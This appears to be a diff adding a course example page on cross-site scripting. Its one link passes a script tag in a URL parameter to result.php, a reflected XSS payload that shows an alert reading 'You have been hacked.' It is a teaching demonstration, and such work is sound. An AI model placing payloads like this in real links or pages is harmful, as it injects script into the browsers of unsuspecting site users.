@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>CSA2 Example - XSS</title>
+    <style type="text/css">
+        input, body, p {
+            font-size: 32px;
+        }
+    </style>
+</head>
+<body>
+
+<a href="result.php?result=<script>alert('You have been hacked.');</script>">This is a dangerous Link</a>
+
+</body>
+</html>
